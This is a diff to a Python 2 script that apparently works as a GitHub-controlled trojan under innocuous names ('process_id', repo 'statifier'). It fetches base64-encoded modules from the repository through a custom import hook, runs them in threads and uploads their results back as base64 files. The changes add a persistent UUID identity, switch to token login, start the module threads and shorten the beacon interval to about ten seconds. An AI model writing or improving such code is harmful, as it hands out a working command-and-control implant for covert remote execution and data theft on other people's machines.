@@ -7,6 +7,7 @@ import random
 import threading
 import Queue
 import os
+import uuid
 
 from github3 import login
 
@@ -15,9 +16,9 @@ try:
 except:
     TOKEN = "-"
 
-process_id = "abc"
+process_id = ""
 
-process_config = "%s.json" % process_id
+process_config = "base.json"
 data_path = "data/%s/" % process_id
 process_modules = []
 configured = False
@@ -25,7 +26,7 @@ task_queue = Queue.Queue()
 
 
 def connect_to_github():
-    gh = login(username=EMAIL, password=PASSWORD)
+    gh = login(token=TOKEN)
     repo = gh.repository('zelttu', 'statifier')
     branch = repo.branch("master")
 
@@ -61,7 +62,7 @@ def get_process_config():
 
 def store_module_result(data):
     bb, repo, branch = connect_to_github()
-    remote_path = "data/%s/%d.data" % (process_id, random.randint(1000, 100000))
+    remote_path = "data/%s/%d.data" % (process_id, int(time.time()))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
     return
@@ -71,10 +72,25 @@ def module_runner(module):
     task_queue.put(1)
     result = sys.modules[module].run()
     task_queue.get()
-
+    print "[*] Executing module_runer for '%s'" % module
     store_module_result(result)
 
     return
+
+
+def init_process_id():
+    print "[*] Initializing process id"
+    if not os.path.exists('./process_id'):
+        f = open("./process_id", "w")
+        f.write(base64.b64encode(uuid.uuid4().bytes))
+        f.close()
+        print "[*] Generated new process id"
+
+    f = open("./process_id", "r")
+    pid = f.readline()
+    f.close()
+    process_id = uuid.UUID(bytes=base64.b64decode(pid))
+    print "[*] Process id updated to '%s' " % str(process_id)
 
 
 class GitImporter(object):
@@ -87,6 +103,7 @@ class GitImporter(object):
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
+                print "[*] Importing library '%s'" % fullname
                 self.current_module_code = base64.b64decode(new_library)
                 return self
 
@@ -100,6 +117,7 @@ class GitImporter(object):
         return module
 
 sys.meta_path = [GitImporter()]
+init_process_id()
 
 while True:
     if task_queue.empty():
@@ -107,5 +125,6 @@ while True:
 
         for task in config:
             t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
             time.sleep(random.randint(1, 10))
-    time.sleep(random.randint(1000, 10000))
+    time.sleep(random.randint(10, 12))
